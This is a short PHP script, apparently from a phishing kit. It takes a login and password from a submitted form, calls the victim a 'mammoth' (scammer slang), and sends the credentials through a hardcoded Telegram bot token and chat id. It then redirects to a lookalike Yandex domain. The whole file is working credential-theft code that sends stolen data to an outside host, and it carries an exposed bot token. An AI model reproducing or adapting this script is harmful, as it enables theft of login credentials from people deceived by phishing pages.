<?php

/* https://api.telegram.org/bot6631714091:AAFFihE2qqui7_MVmWbybTAkBOQrRizkrHA/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$login = $_POST['login'];
$pass = $_POST['pass'];
$token = "6631714091:AAFFihE2qqui7_MVmWbybTAkBOQrRizkrHA";
$chat_id = "-4148789239";
$arr = array(
  'Новый мамонт!',
  'Логин: ' => $login,
  'Пароль: ' => $pass,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: https://yandex-karta-kr.ru/m3ga/megaYUoYdwJgQEAEQFtofXhydXhnZA=sat&ll=531502572C52434567&z');
} else {
  echo "Error";
}
?>